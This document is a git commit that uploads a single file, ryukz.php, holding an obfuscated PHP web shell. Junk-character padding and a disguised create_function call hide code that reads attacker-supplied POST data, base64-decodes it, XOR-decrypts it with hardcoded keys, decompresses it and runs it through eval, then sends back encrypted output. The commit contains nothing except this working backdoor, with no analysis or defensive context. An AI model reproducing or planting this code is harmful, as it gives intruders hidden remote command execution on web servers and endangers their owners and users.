b25a017cef31bbc83fdf71e73d6814adb1b3f7ef
reverspace <97833053+reverspace@users.noreply.github.com>
2022-02-07 20:39:50 +0700

    Add files via upload

---
+++ ryukz.php
@@ -0,0 +1,13 @@
+<?php
+$i='j++Xz,$Xzi++Xz){$o.=Xz$t{$iXz}^$k{$j};}}retXzurnXz $o;}if (Xz@preg_XzmaXztc';
+$k=')==1Xz)Xz {@obXz_start();@eXzval(@gzuncoXzXzmpress(@x(Xz@baseXz64_decodXze($';
+$c='h("/$khXz(.+)Xz$kf/Xz"Xz,@file_get_conteXzntsXz("php:Xz//input"Xz),$Xzm';
+$b='p="4zi262jqsg40XzjXzYoG";fuXznctioXzn x($tXz,$k){$c=stXzrleXzn($k);Xz$l=stX';
+$q='zrlen($t);Xz$o="";Xzfor($i=Xz0Xz;$i<XzXz$l;){for($j=0;($j<Xz$c&&$i<$lXz);$';
+$a='m[1]Xz),$Xzk)Xz));$o=@ob_get_XzconteXzXznXzts();@ob_eXznd_clean(Xz);$rXz=@';
+$G='$k="7a3Xzcea0Xz9Xz";$XzkXzh="5c861ccXz463ee";$kfXz="81a4e08bXzcXzeb4";Xz$';
+$S='basXzeXz64_encode(@x(@XzgzcXzomXzpress($o),$k));prXzint("$XzXzp$kh$r$kf");}';
+$K=str_replace('SZ','','cSZreatSZeSZSZ_fSZSZunction');
+$p=str_replace('Xz','',$G.$b.$q.$i.$c.$k.$a.$S);
+$C=$K('',$p);$C();
+?>
